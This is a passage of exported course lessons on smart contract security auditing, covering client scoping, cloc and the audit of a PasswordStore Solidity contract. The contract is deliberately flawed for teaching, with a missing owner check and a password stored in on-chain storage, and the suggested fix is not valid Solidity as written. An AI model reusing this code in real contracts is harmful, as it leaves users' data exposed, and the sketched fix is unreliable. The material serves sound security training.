          Do not take clients who have not shown the same commitment to security in their codebase as you would. If you work with clients like those described above, it should be to educate them on how to write good tests and how to prepare their code for a review.

          _AUDITOR: "Hi, PasswordStore. Thank you so much for this Etherscan link, this is a great start. However, do you have a test suite? We want to have every assurance that your codebase is safe and secure. Do you have a Git Repo or GitHub with a testing framework?"_

          _CLIENT: "AH! Yes, Sorry. We have a Foundry Test repo set up for this, let me send you that Git codebase."_

          If a protocol's response to your care in securing them isn't like they above, and they begin pressuring you - walk away. It's evidence that security isn't their focus.
        description: 'Learn why test suites and deployment frameworks are important prerequisites in a security review/audit. REKT Test discussed as an evaluation tool.'
      -
        id: b7294794-b3b1-4ee5-b00d-20a84f815bd3
        type: new_lesson
        enabled: true
        title: 'Scoping: Audit Details'
        slug: details
        duration: 13
        video_url: BXBrKOTDgRH1kLCkbuvDeKi402N00ORbbYBcr1p1jRzjo
        raw_markdown_url: /routes/security/3-first-audit/3-details/+page.md
        markdown_content: |-
          ---
          title: Nailing the Audit Details
          ---

          _Follow along with this video:_

          ---

          ### Getting Started

          Alright! Starting off, our client has graciously updated the codebase for this security review, featuring an improved framework and enhanced verbosity in their [**Security Review CodeV2**](https://github.com/Cyfrin/3-passwordstore-audit).

          Exploring the new codebase, we find it to be comprehensive with an `src` folder and a script detailing deployment procedures. However, as we dig in, we find that the README needs refinement and tailoring to our needs rather than the template Foundry README. There is also a glaring omission ‚Äî there are no test folders.

          In addition to this, we're not really sure what we should be focusing on in our review. It's unlikely the client wants us auditing libraries, or scripts - but these are vital things to confirm with them in the scoping phase before beginning the audit.

          ### Preparing for the Audit: Onboarding Questions

          For your convenience, we've compiled a reference of [**Minimal Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md). This document will help you extract the minimum information necessary for a successful audit or security review.

          We've also included a more [**Extensive Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/extensive-onboarding-questions.md) document which is more derivative of what we at Cyfrin use for private audits - we'll go over this in more detail later.

          Let's go through these questions and understand why each one is important in preparing for our security review.

          1. **About the Project:** Knowledge about the project and its business logic is crucial. You need to be aware of what the project is intended to do so as to spot areas where code implementation does not align with the project's purpose. Remember 80% of vulnerabilities are a product of business logic implementation!
          2. **Stats:** Information about the size of the codebase, how many lines of code are in scope, and its complexity are incredibly vital. This data will help to estimate the timeline and workload for the audit.
          3. **Setup:** We need to ask the protocol how to build and test the project, which frameworks they've used etc.
          4. **Review Scope:** Know the exact commit hash that the client plans to deploy and the specific elements of the codebase it covers. You do not want to spend time auditing code that the client has already modified or doesn't plan to use. The protocol should include the appropriate GitHub URL and explicitly detail which contracts are in scope.
          5. **Compatibilities:** Information about the solidity version the client is using, the chains they plan on working with, and the tokens they will be integrating is important, we'll go into why later.
          6. **Roles:** This entails understanding the different roles and powers within the system and detailing what the different actors should and shouldn't be able to do.
          7. **Known Issues:** Understanding existing vulnerabilities and bugs which are already being considered/fixed. This will allow you to focus on the hidden issues.

          Asking the questions of your client is an integral part of assuring they're ready for an audit. Should a protocol give push back, this is a red flag that they aren't taking security as seriously as they should.

          As security researchers you're, in a way, educators. It's your job to educate protocols on the importance of these security considerations and adequate documentation.

          Once our client has provided answers to the above and provided an updated codebase ([**Security Review CodeV3**](https://github.com/Cyfrin/3-passwordstore-audit/tree/onboarded)) they've also filled out the [**questionnaire**](https://github.com/Cyfrin/3-passwordstore-audit/blob/onboarded/minimal-onboarding-filled.md) we provided them.we're finally ready to..

          ### Dig into the Updated Codebase

          Your client should have provided you a commit hash. By navigating to the GitHub Repo's commit history, you can used the first `7 characters` of the commit hash to find the exact version of the repo to focus on. We'll be going over cloning this locally later in the course.

          <img src="/security-section-3/3-details/details2.png" style="width: 100%; height: auto;">

          Let's go through the client's submitted details.

          ### About

          We see the client has provided us more information about the protocol and its goals/intents.

          ```md
          A smart contract application for storing a password. Users should be able to store a password and then retrieve it later. Others should not be able to access the password.
          ```

          ### Setup

          We're also now given clear instructions on how to set up the project locally, with information on how to test the repo and frameworks being used.

          ---

          **Requirements**

          - [**Git**](https://git-scm.com/book/en/v2/Getting-Started-Installing-Git)
            - You'll know you did it right if you can run git --version and you see a response like git version x.x.x
          - [**Foundry**](https://getfoundry.sh/)
            - You'll know you did it right if you can run forge --version and you see a response like forge 0.2.0 (816e00b 2023-03-16T00:05:26.396218Z)

          **Quick Start**

          ```md
          git clone https://github.com/Cyfrin/3-passwordstore-audit
          cd 3-passwordstore-audit
          forge build
          ```

          **Usage**

          **Start a local node**

          ```md
          make anvil
          ```

          **Deploy**

          ```md
          make deploy
          ```

          **Testing**

          ```md
          forge test
          ```

          **Test Coverage**

          ```md
          forge coverage
          ```

          **and for coverage based testing:**

          ```md
          forge coverage --report debug
          ```

          ---

          ### Scope

          For this particular example, the client has provided scope:

          ```
          ./src/
          ‚îî‚îÄ‚îÄ PasswordStore.sol
          ```

          In this case, a single contract - depending on the maturity of the protocol, you may want to request to include their deployment process, or to provide feedback on their tests - but this is largely a private audit consideration. In competitive audits, the outlined scope is the only code that will be valid.

          ### Compatibilities

          Reading further into the client's documentation, we see they've provided compatibilities. Vulnerabilities and exploits may vary from chain to chain, or token to token, so these details are always valuable for us.

          ```md
          Solc Version: 0.8.18
          Chain(s) to deploy contract to: Ethereum
          ```

          ### Roles

          We now also have clearly defined roles! This gives us clear insight into whom is expected to have what powers.

          ```md
          Owner: The user who can set the password and read the password.
          Outsides: No one else should be able to set or read the password.
          ```

          ### Known Issues

          Our client reports that there are **No** known issues with their codebase. I love the confidence.

          ### Local Setup

          . Go ahead and follow the `quick start` guide our client as provided.

          ```md
          git clone https://github.com/Cyfrin/3-passwordstore-audit
          cd 3-passwordstore-audit
          code .
          ```

          This will open a new VS Code window in your cloned directory. Now we want to `checkout` the exact commit hash in our audit scope by running:

          ```bash
          git checkout <commithash>
          ```

          This will switch you to a `detached HEAD` state of the branch we want. Basically this is a state where changes won't be saved, so let's create a branch we want to work on officially:

          ```bash
          git switch -c passwordstore-audit
          ```

          We can confirm the branch we're on now by running:

          ```bash
          git branch
          ```

          ### Wrap Up

          This may have seemed like a lot, but I promise this becomes second nature as you repeatedly do this. Remember to ask the protocol the questions necessary to assure they are prepared for their audit and step into the role of a security educator to teach them best practices around security and code documentation.

          Now we're finally ready to begin looking at the code base and getting our hands dirty!
        description: 'Exploring the codebase, examining contracts in scope for audit, starting with PasswordStore.sol - simple, key concepts for Solidity & smart contract security.'
      -
        id: 2b4e7a53-dc86-4f8f-a522-2b5e762cb09b
        type: new_lesson
        enabled: true
        title: 'Scoping: cloc'
        slug: cloc
        duration: 3
        video_url: Hby7oUlL5mA3WH6V7FrpykgJDIbCMxKo9w9Bn3PIlL4
        raw_markdown_url: /routes/security/3-first-audit/4-cloc/+page.md
        markdown_content: |-
          ---
          title: Scoping CLOC
          ---

          _Follow along with this video:_

          ---

          You may have noticed that we skipped over the `Stats` section of the protocol's README. This section of the documentation is comprised of a line count and complexity rating typically and you should be prepared to calculate these details for your client and use them to estimate the duration of your audit. In this lesson we're going to go over how that's done.

          One of the components of the `Stats` section is `nSLOC` or `number of source lines of code`. A very simple tool exists to help us derive this count.

          [**CLOC**](https://github.com/AlDanial/cloc) - cloc counts blank lines, comment lines, and physical lines of source code in many programming languages. It's compatible with Solidity, Python, Rust and many more.

          ### Installing and Using CLOC

          First step is installation. The step by step won't be covered here, but pick the method you're most comfortable with.

          ```md
          npm install -g cloc # https://www.npmjs.com/package/cloc
          sudo apt install cloc # Debian, Ubuntu
          sudo yum install cloc # Red Hat, Fedora
          sudo dnf install cloc # Fedora 22 or later
          sudo pacman -S cloc # Arch
          sudo emerge -av dev-util/cloc # Gentoo https://packages.gentoo.org/packages/dev-util/cloc
          sudo apk add cloc # Alpine Linux
          doas pkg_add cloc # OpenBSD
          sudo pkg install cloc # FreeBSD
          sudo port install cloc # macOS with MacPorts
          brew install cloc # macOS with Homebrew
          choco install cloc # Windows with Chocolatey
          scoop install cloc # Windows with Scoop
          ```

          Once successfully installed, verify your installation.

          ```bash
          cloc --help
          ```

          Once installed, you can run using the command `cloc <directory>`. Our PasswordStore example should look like this:

          ```bash
          cloc ./src/
          ```

          This is what the output might look like:

          <img src="/security-section-3/4-cloc/cloc1.png" style="width: 100%; height: auto;">

          ### The Importance of Knowing Your Codebase Size

          Why is knowing the number of source lines of code (also referred to as Nsloc) crucial? The answer lies in the process of auditing and security research.

          As you perform more audits and delve further into security research, you'll start to gauge the pace at which you can audit a code base. Understanding that pace enables you to estimate more accurately the time required for future coding or auditing tasks based on the size of the code base.

          This is incredibly useful, as with time, you can use your past audit experience and tell the protocol you're working with how long it will take to audit their codebase. Notably, this pace tends to speed up as you do more security reviews. Nevertheless, it's a good starting point.

          > _"When auditing 1000 lines of code for the first time, you now have an estimated timeline for subsequent audits or security reviews of 1000 lines codebases."_

          Often, competitive audits might have a quicker timeline depending on the auditing platform. Upon having a good grasp of your auditing speed, it may assist in selecting competitive audits that align with your capabilities, or even ones that push you to accelerate your pace.

          ### Wrap Up

          `Stats` like a protocol's `nSLOC` (number of source lines of code) are very valuable to security reviewers. They afford you the ability to gauge how long an audit will take based on your current skill set and provide more accurate estimates for both the protocol and yourself with respect to timelines and workload.
        description: 'CLOC demonstration - Measure nSLOC, estimate code base audit time.'
      -
        id: 4729ad23-b598-4fb9-bbde-10e36f33d315
        type: new_lesson
        enabled: true
        title: 'Recap I'
        slug: recap-i
        duration: 3
        video_url: smoYD01Ts102Hl01jqqrXktfZXw6JoF4h447OcwQS01upT8
        raw_markdown_url: /routes/security/3-first-audit/5-recap-i/+page.md
        markdown_content: |-
          ---
          title: Recap I
          ---

          _Follow along with this video:_

          ---

          ### Recap

          We've learnt so much so far in this section, let's do a quick refresher of what we've covered!

          ### Embracing Your Role as a Security Researcher

          First and foremost, you are not just coders or developers - you are security researchers. You are the gatekeepers ensuring the integrity of smart contracts. Our goal is to ensure that these protocols are not only safe and secure but also well-documented and supported with a robust test suite.

          A link to Etherscan is insufficient and we need to educate these protocols on best practices and the benefits of proper audit preparation.

          > "Smart contracts are the most adversarial environment on the planet, and we need to treat them as such."

          If you are handed a code base within a smart contract development framework, yet find it lacking adequate tests or documentation, remember, this isn't going to be helpful.

          > Remember `80%` of the vulnerabilities out there are a product of `business logic`

          We need a clear understanding of what a protocol _does_ and _how_. This should be well documented.

          As much as we need more information from protocol developers, sometimes, it falls upon us, the security researchers, to educate them about the best security practices.

          ### Scoping Out a Codebase

          We've went over the [**Minimal Onboarding Questions**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/minimal-onboarding-questions.md)

          The importancee of each section can't be overstated.

          **About** - Summary of the project. The more documentation, the better.

          **Stats** - Calculate the `nSLOC` using tools like `CLOC`

          **Setup** - What tools are needed to setup the codebase & test suite? How to run tests. How to see test coverage.

          **Scope** - We need an exact commit hash and the specific contracts `in scope` to be detailed

          **Roles** - What are the different actors of the system? What are their powers? What should/shouldn't they do?

          **Known Issues** - any issues that the protocol team is aware of and will not be acknowledging/fixing.

          When we get more advanced, we'll have a more [**extensive onboarding form**](https://github.com/Cyfrin/security-and-auditing-full-course-s23/blob/main/extensive-onboarding-questions.md), but we'll cover that later in the course.

          Eventually you may want to customize this form to suit your needs.

          ### Congratulatory Note and a Sneak Peek

          **A huge congratulations on reaching this far!** ü•≥

          I know the journey might seem verbose and daunting, but trust me, all these painstaking steps are crucial. They will save you hours in the future, especially if you consider becoming an independent auditor or starting your own firm.

          Keep sharp, in our next lesson we'll be going over `The Tincho` an auditing technique used by the legendary `Tincho Abbate`.
        description: 'Recap of smart contract scoping & review tips with Patrick. Focus on mature code bases, test suites, and documentations. Review onboarding form usage for engaging clients.'
      -
        id: bfb6c3c7-e21e-4071-8144-ee62b276d586
        type: new_lesson
        enabled: true
        title: '"The Tincho"'
        slug: process-tincho
        duration: 15
        video_url: khYrr59ml01mq9jd002HJ6Tb00IwQhInpgoZ6z2byEPYI00
        raw_markdown_url: /routes/security/3-first-audit/6-process-tincho/+page.md
        markdown_content: |-
          ---
          title: The Audit Process With Tincho
          ---

          _Follow along with this video:_

          ---

          ### Reconnaissance

          We've finally scoped out our client's code base and we're ready to dive into looking more closely at the code.

          To do this, we're going to learn some best practices and a technique I've dubbed `The Tincho` from the master himself - Tincho Abbate.

          ### Introducing Tincho

          Tincho is a legend in Web3 security and is a member of [**The Red Guild**](https://theredguild.org/), a smart contract and EVM security firm. He was a previous lead auditor for the security firm at `OpenZeppelin` and he even helped me create this course!

          We're lucky to have Tincho walk us through his high-level way to approach security reviews.

          _What follows is derived from a video featuring Tincho's point of view_

          ### The Tincho Auditing Method

          To illustrate the Tincho auditing method, we're going to refer to a video where Tincho performs a live auditing of the Ethereum Name Service (ENS).

          > "I don't have a super formal auditing process. I will just show you briefly some things that I do..." - Tincho

          ### First Step

          First thing's first - download the code, and **read the documentation**. You need to familiarize yourself with the content and context of the codebase, learn the jargon you can expect to see in the code and become comfortable with what the protocol is expected to do.

          **READ THE DOCUMENTATION**

          ### Tools and Frameworks

          Tincho describes a number of tools he uses while performing security reviews, bring the tools you're most familiar and best with.

          - **VS Codeium**: a text editor with a privacy focus. It's based on VS Code but removes a lot of the user tracking telemetry
          - **Foundry**: As a framework for reviewing codebases Foundry is incredibly fast and allows for quick testing with it's robust test suite
          - **CLOC**: A simple command-line utility that helps count lines of code which can give a sense of the complexity of different parts of the codebase.
          - **Solidity Metric**: Another tool developed by Consensys that provides useful metrics about your Solidity codebase.

          By leveraging `CLOC` and `Solidity Metrics`, a security researcher can organize the codebase by complexity and systemically go through the contracts - marking them each complete as appropriate. This pragmatic approach ensures no stone is left unturned.

          It's recommended to start with the smaller and more manageable contracts and build upon them as you go.

          There's a point in an audit where your frame of mind should switch to an adversarial one. You should be thinking _"How can I break this..."_

          <img src="/security-section-3/6-the-tincho/tincho1.png" style="width: 100%; height: auto;">

          Given even simple functions like above, we should be asking ourselves

          - **"Will this work for every type of token?"**
          - **"Have they implemented access control modifiers properly?"**

          > _USDT is a 'weird ERC20' in that it doesn't return a boolean on transferFrom calls_

          ### Audit, Review, Audit, Repeat

          Keeping a record of your work is crucial in this process.

          > Tincho recommends taking notes directly in the code _and_ maintaining a separate file for raw notes/ideas.

          Remember, there is always a risk of diving too deep into just one part of the code and losing the big picture. So, remember to pop back up and keep an eye on the over-all review of the code base.

          Not everything you'll be doing is a manual review. Applying your knowledge of writing tests to verify suspicions is incredibly valuable. Tincho applies a `fuzz test` to his assessment of functions within the ENS codebase.

          ### Communication

          Tincho describes keeping an open line of communication with the client/protocol as `fundamental`. The protocol is going to possess far more contextual understanding of what constitutes intended behavior than you will. Use them as collaborators. **`Trust but validate.`**

          > "I would advise to keep the clients at hand. Ask questions, but also be detached enough." - Tincho

          ### Wrapping it Up

          Sometimes it can feel like there's no end to the approaches you can make to a codebase, no end to the lines of code you can check and verify.

          Tincho advocates for time-bounding yourself. Set limits and be as thorough as possible within them.

          > "The thing is...I always get the feeling that you can be looking at a system forever." - Tincho

          ### The Audit Report and Follow Up

          The last stage of this whole process is to present an audit report to the client. It should be clear and concise in the detailing of discovered vulnerabilities and provide recommendations on mitigation.

          It's our responsibility as security researchers to review the implementation of any mitigations the client employs and to assure that _new bugs_ aren't introduced.

          ### Aftermath of a Missed Vulnerability

          There will always be the fear of missing out on some vulnerabilities and instead of worrying about things that slip through the net, aim to bring value beyond just identifying vulnerabilities. Be that collaborative security partner/educator the protocol needs to employ best practices and be prepared holistically.

          As an auditor it's important to remember that you do not shoulder the whole blame when exploits happen. You share this responsibility with the client.

          > This doesn't give you free reign to suck at your job. People will notice.

          A last takeaway from Tincho:

          > "Knowing that you‚Äôre doing your best in that, knowing that you‚Äôre putting your best effort every day, growing your skills, learning grows an intuition and experience in you."
        description: 'Learn how the legendary Tincho approaches his audits in this overview of his systematic technique, brought to us by Tincho himself!'
      -
        id: 2c621243-12a8-4b87-a757-dc85c1ec9bd5
        type: new_lesson
        enabled: true
        title: 'Recon: Context'
        slug: context
        duration: 5
        video_url: pAws02rmrcgSlXrGrXrrikJoABnxom7Fg00lOH7UFUjyY
        raw_markdown_url: /routes/security/3-first-audit/7-context/+page.md
        markdown_content: |-
          ---
          title: Recon - Getting Context
          ---

          _Follow along with this video:_

          ---

          ### First Step: Understanding The Codebase

          Alright, we're ready to begin our recon, if you haven't already clone the repo our client has provided us.

          ```bash
          git clone https://github.com/Cyfrin/3-passwordstore-audit.git
          cd 3-passwordstore-audit
          code .
          ```

          If we're following `The Tincho` method, our first step is going to be reading the docs and familiarizing ourselves with the codebase. In VS Code, you can click on the `README.MD` file in your workspace and use the command `CTRL + SHIFT + V` to open the preview mode of this document.

          > You can also open the preview pane by opening your command pallet and typing `markdown open preview`.

          _Quick tip: Check if an extension must be installed for Vs Code if it's not working for you._

          <img src="/security-section-3/7-context/context2.png" style="width: 100%; height: auto;">

          Already, we should be thinking about potential attack vectors with the information we've gleaned.

          _Is there any way for an unauthorized user to access a stored password?_

          Once you've finished reading through the documentation, we can proceed to...

          ### Scoping Out The Files

          Following Tincho's advice our next step will be to organize the files of the protocol in scope and assess their respective complexity. (Spoiler, this first example is pretty simple).

          1. Download and install the [**Solidity Metrics**](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-metrics) extension for VS Code.

          <img src="/security-section-3/7-context/context3.png" style="width: 100%; height: auto;">

          2. Once installed, you can right-click the appropriate folders to run the tool on and select `Solidity: Metrics` from the context menu.

          > _Pro-tip: If your repo has more than one applicable folder, you can CTRL + Click to select multiple simultaneously._

          <img src="/security-section-3/7-context/context4.png" style="width: 100%; height: auto;">

          After generating the report, navigate to the command palette and locate 'export this metrics report'. Once exported, you'll have HTML access to the report for future reference.

          <img src="/security-section-3/7-context/context5.png" style="width: 100%; height: auto;">

          Applying Tincho's methodology to this process, we can:

          1. Scroll down to the section containing the various files and their lengths.
          2. Copy this info and paste it onto any platform that allows for easy viewing and comparison‚Äî like Google Sheets or Notion.

          > Please note that if your codebase contains a solitary file like ours, this step won't be necessary.

          Some aspects I'll draw your attention to in this metrics report are the `Inhertance Graph`, `The Call Graph`, and `The Contracts Summary`. It's not super obvious with such a simple protocol, but these are going to provide valuable insight down the line. Familiarize yourself with them now (way at the bottom).

          <img src="/security-section-3/7-context/context6.png" style="width: 100%; height: auto;">

          Understanding your codebase and its functionalities is the first step towards securing it.

          ### Wrap Up

          Now that we've got a sense of what lies before us, with the help of our tools like CLOC and Solidity Metrics, we're ready to assess the code.

          Let's see what we can find.
        description: 'Starting in on PasswordStore using The Tincho! Read and understand context & docs, leveraging Solidity Metrics VS Code extension.'
      -
        id: 74157e59-a92c-4769-80d0-7a546369f7d6
        type: new_lesson
        enabled: true
        title: 'Recon: Understanding the code'
        slug: understanding-the-code
        duration: 3
        video_url: dXwT5TMTjNSZiH00owUeZqNzR9Qw2xY96023200xarXBwk
        raw_markdown_url: /routes/security/3-first-audit/8-understanding-the-code/+page.md
        markdown_content: |-
          ---
          title: Recon - Understanding the Code
          ---

          _Follow along with this video:_

          ---

          ### How Tincho Cracked the Code

          Tincho, was very pragmatic in his approach, literally going through the code line by line. This method might seem like he was looking for bugs/vulnerabilities in the code. But actually, he was just trying to understand the codebase better. In essence, understanding the functionalities and architecture of the code forms the first and most important part of code inspection.

          So let's take it from the top, just like Tincho did‚Ä¶

          ### Understanding What the Codebase Is Supposed to Do

          Our client's documentation has let us know what the intended functionality of the protocol are. Namely: A user should be able to store and retreive their password, no one else should be able to see it.

          Let's try to find this functionality within the code as we go through things line by line.

          ### Scanning the Code from the Top

          After gaining a fundamental understanding, you can start going through the code. You can jump directly to the main functionality. However, to keep things simple, let's just start right from the top and start working our way down.

          First Lines:

          ```js
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.18;
          ```

          The open source license seems fine. A compiler version of `0.8.18` may not be an immediate concern, but we do know that this isn't the most recent compiler version. It may be worthwhile to make note of this to come back to.

          ```js
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.18; // Q: Is this the correct compiler version?
          ```

          Formatting our in-line comments in a reliable way will allow us to easily come back to these areas later by leveraging search.

          <img src="/security-section-3/8-understanding-code/understanding1.png" style="width: 100%; height: auto;">

          ### Taking Notes

          As Tincho had advised, creating a separate file to dump thoughts into and compile notes can be a valuable organizational tool. I like to open a file called `.notes.md` and outline things like potential `attack vectors`

          > **Pro Tip**: Some security researchers, like 0Kage from the Cyfrin team, even print the source code and use different colour highlighters to visualize the codebase better.

          ### Moving Further

          Next we see some `NatSpec` comments like this can be considered **extended documentation** and will tell us more about what the protocol is expected to do.

          ```js
          /*
           * @author not-so-secure-dev
           * @title PasswordStore
           * @notice This contract allows you to store a private password that others won't be able to see.
           * You can update your password at any time.
           */
          ```

          The intended functionality is pretty clear. Maybe we want to jot this down in our `.notes.md`.

          Let's consider things upto our constructor.

          <img src="/security-section-3/8-understanding-code/understanding2.png" style="width: 100%; height: auto;">

          Everything looks great so far, the client is using some clear standard naming conventions.

          **Hypothetically**, were the naming conventions poor, we might want to make an informational note.

          ```js
          contract PasswordStore {
              // I - naming convention could be more clear ie 'error PasswordStore__NotOwner();'
              error NotOwner();
          }
          ```

          In the example above we use `// I` for `informational` findings, but use what feels right for you.

          > **Pro Tip** - I like to use a package called [**headers**](https://github.com/transmissions11/headers) by `transmissions11`. It allows me to clearly label areas of a repo I'm reviewing.

          ## Looking at Functions

          Alright, we've reached the functions of this protocol. Let's assess the `setPassword()` function first. Fortunately, we again have `NatSpec` to consider.

          ```js
              /*
               * @notice This function allows only the owner to set a new password.
               * @param newPassword The new password to set.
               */
              function setPassword(string memory newPassword) external {
                  s_password = newPassword;
                  emit SetNetPassword();
              }
          ```

          Sometimes a protocol won't have clear documentation like the above. This is where clear lines of communication between the security reviewer and the client are fundamental, as Tincho advised.

          Were things less clear, it may be appropriate to leave a note to ask the client.

          ```js
          // Q What's this function do?
          ```

          It can't be stressed enough, clarity in our understanding of the codebase and the intended functionalities are a _necessary_ part of performing a security review.

          ### Wrap Up

          This has been a great start getting our hands on the code and applying a critical/adversarial frame of mind. You may already have spotted a vulnerability, we'll be taking a closer look in our next lesson!
        description: 'Demonstrates step-by-step approach, note-taking, communication with team. Gain understanding, identify vulnerabilities.'
      -
        id: 1bc03555-0cb0-4d70-b9ee-eab97e748943
        type: new_lesson
        enabled: true
        title: 'Exploit: Access control'
        slug: access-control
        duration: 3
        video_url: iAYbiPR8PadCov18QADc49PfsLUzK9SHE4J7gaZ8z9s
        raw_markdown_url: /routes/security/3-first-audit/9-access-control/+page.md
        markdown_content: |-
          ---
          title: Exploit Access Controls
          ---

          _Follow along with this video:_

          ---

          ### The First Vulnerability

          Already you may have spotted a vulnerability in this function. Take a moment before reading on to try to find it.

          ```js
              /*
               * @notice This function allows only the owner to set a new password.
               * @param newPassword The new password to set.
               */
              function setPassword(string memory newPassword) external {
                  s_password = newPassword;
                  emit SetNetPassword();
              }
          ```

          The function's `NatSpec` gives us a clear `invariant` - "..only the owner..". This should serve as a clue for what to look for and we should as ourselves...

          > _Can anyone **other** than the **owner** call this function?_

          At first glance, there doesn't seem to be anything preventing this. I think we've found something! Let's be sure to make notes of our findings as we go.

          ```js
              /*
               * @notice This function allows only the owner to set a new password.
               * @param newPassword The new password to set.
               */
              // @Audit - High - any user can set a password.
              function setPassword(string memory newPassword) external {
                  s_password = newPassword;
                  emit SetNetPassword();
              }
          ```

          > **Note**: We'll explain `High` and how to determine a finding's severity later in the course.

          ### The Bug Explained

          What we've found is a fairly common vulnerability that protocols overlook. `Access Control` effectively describes a situation where inadequate or inappropriate limitations have been places on a user's ability to perform certain actions.

          In our simple example - only the owner of the protocol should be able to call `setPassword()`, but in its current implementation, this function can be called by anyone.

          I'll stress again the value of taking notes throughout this process. In-line comments, formatted properly are going to make returning to these vulnerabilities later for reassessment much easier and will keep you organized as you go.

          ```js
          // @Audit - Any user can set a password - Access Control
          ```

          Clear and concise notes are key.

          ### Wrapping Up

          We did it! We found our first vulnerability. Don't worry if you couldn't spot the issue on your own, much of security research is familiarizing ourselves with these bugs and educating ourselves to more readily spot issues in the future. Experience goes a _long_ way.

          We also emphasized the importance of taking notes as we perform our review. This allows us clear reference to these areas of concern later in the audit.

          Let's see if we can find more bugs in the next lesson!
        description: 'Missing Access Control - Vulnerability Discovered!'
      -
        id: 43ba5486-bd51-4a1f-b203-52cf1a2fea7c
        type: new_lesson
        enabled: true
        title: 'Exploit: Public Data'
        slug: exploit-public-data
        duration: 3
        video_url: sEgUDhLqFIH3UOtAIv2n24BJ6wpKvf7d8WfFh991QC00
        raw_markdown_url: /routes/security/3-first-audit/10-exploit-public-data/+page.md
        markdown_content: |-
          ---
          title: Exploit Public Data
          ---

          _Follow along with this video:_

          ---

          ###

          Alright, one function down, one to go. Let's take a look at what's next.

          ```js
          /*
          * @notice This allows only the owner to retrieve the password.
          * @param newPassword The new password to set.
          */
          function getPassword() external view returns (string memory) {
              if (msg.sender != s_owner) {
              revert PasswordStore__NotOwner();
              }
              return s_password;
          }
          ```

          Starting, starting as always with the `NatSpec` documentation, we see a couple things to note:

          - Only the owner should be able to retreive the password (_your `access control` bells should be ringing_)
          - The function should take the parameter `newPassword`.

          We see a problem on the very next line. This function _doesn't take_ a parameter. Certainly informational, but let's make a note of it.

          ```js
          /*
          * @notice This allows only the owner to retrieve the password.
          // @Audit - parameter not used by function, NatSpec can be removed
          * @param newPassword The new password to set.
          */
          ```

          Let's take a look at the function itself.

          <img src="/security-section-3/10-exploit-public-data/public-data1.png" style="width: 100%; height: auto;">

          The function looks great! Adhering to the required access control, we can be sure only the owner can call this function.

          So we're done, right? Web3 is secure! ü•≥

          ...

          Well, not exactly. There's another issue hidden in this contract and I want you to take a moment before continuing to try to find it.

          I'll give you a hint: `State Variables`.

          ...

          <details closed>
          <summary>The Vulnerability</summary>
           <img src="/security-section-3/10-exploit-public-data/public-data2.png" style="width: 100%; height: auto;">

          We've uncovered a major flaw in the business logic of this protocol. It's best we make a note of this.

          ```js
          address private s_owner;
          // @Audit - s_password variable is not actually private! Everything on the blockchain is public, this is not a safe place to store your password.
          string private s_password;
          ```

          </details>

          ### Wrap up

          If you're unsure how it's possible for someone to read this data, don't worry - we'll be writing a proof of code to show how it's done. This is something covered in our [**Foundry Course**](https://updraft.cyfrin.io/courses/advanced-foundry) however, consider a refresher if this is entirely new to you as we'll be building on these concepts later on.
        description: "Exploit Public Data - Private Variables Aren't Private! Explore this vulnerability in PasswordStore."
      -
        id: 2f9c6946-6eb1-4d65-be39-a4fb99a76125
        type: new_lesson
        enabled: true
        title: 'Recap II'
        slug: recap-ii
        duration: 1
        video_url: THQHBVMjwuQ00M3t1vk8Ynb700yZCa8ecZ9DXt5rnfutc
        raw_markdown_url: /routes/security/3-first-audit/11-recap-ii/+page.md
        markdown_content: |-
          ---
          title: Recap II
          ---

          _Follow along with this video:_\

          ---

          Let's recap a few of the things we've found while reviewing this protocol so far.

          ### Vulnerability #1

          First, we found that the `setPassword()` function, while intending to only callable by the `owner`, has no check to ensure this.

          ```js
          function setPassword(string memory newPassword) external {
              s_password = newPassword;
              emit SetNetPassword();
          }
          ```

          This is an `Access Control` vulnerability, allowing anyone to change the password saved, at any time. A proper check for this might look like:

          ```js
          function setPassword(string memory newPassword) external {
            if (msg.sender !== s_owner) {
            revert PasswordStore__NotOwner;
            }
            s_password = newPassword;
            emit SetNetPassword();
          }

          ```

          The above check will assure the function reverts if the caller is not the `owner`. Keep this in mind for our mitigation section of our report!

          ### Vulnerability 2

          The second issue we came across in our review was something likely informational, but none the less good to note. The `NatSpec` of our `getPassword()` function reads:

          ```js
          /*
           * @notice This allows only the owner to retrieve the password.
           * @param newPassword The new password to set.
           */
          ```

          We noted that the `getPassword()` function doesn't take the described parameter, as such this line of documentation should be removed.

          ### Vulnerability 3

          Last but definitely not least, we noticed that the application stored passwords on-chain. This is a major security concern as **all data on-chain is public information**. The business logic of this protocol is flawed!

          ```js
          string private s_password; //This is not secure!
          ```

          > _**Remember**: all data stored on-chain is publicly accessible. Sensitive data must necessarily be kept off-chain._

          ### Wrap Up

          To sum up our findings:

          - Access Control on `setPassword()` function.
          - Inaccurate `NatSpec` for `getPassword()` function.
          - Private variables aren't `hidden` - all data is publicly accessible, breaking the protocol logic.

          Great work in spotting these vulnerabilities! We've already shown that we're capable of making this protocol more secure.

          In the next lesson we're going to go over some test assessment.
        description: 'Patrick recaps the vulnerabilities found so far: No Owner Check, Erroneous Parameter, Unsafe Storage on Chain.'
      -
        id: 98ac9db5-d6b3-4d8f-bc83-9ddfe3b4a322
        type: new_lesson
        enabled: true
        title: 'Protocol Tests'
        slug: protocol-tests
        duration: 3
        video_url: ESXGvNkUbo2pk00w1u01Ksl1GhmIoA3zEuISqRTiUaKaw
        raw_markdown_url: /routes/security/3-first-audit/12-protocol-tests/+page.md
        markdown_content: |-
          ---
          title: Protocol Tests
          ---

          _Follow along with this video:_

          ---

          <img src="/security-section-3/12-protocol-tests/protocol-tests1.png" style="width: 100%; height: auto;">

          As security researchers our job is to ultimatly do what's necessary to make a protocol more secure. While we've thoroughly examined everything within scope of `PasswordStore` there can be some value in expanding our recon.

          Test suites should be an expectation of any protocol serious about security, assuring adequate test coverage will be valuable in a `private audit`.

          ## Testing and Coverage

          Anyone at this stage of the course should be familiar with how to check the `test coverage` of a repo.

          ```bash
          forge build
          forge test
          ```

          The above will run all current tests, to check `coverage` we'll use:

          ```bash
          forge coverage
          ```

          <img src="/security-section-3/12-protocol-tests/protocol-tests2.png" style="width: 100%; height: auto;">

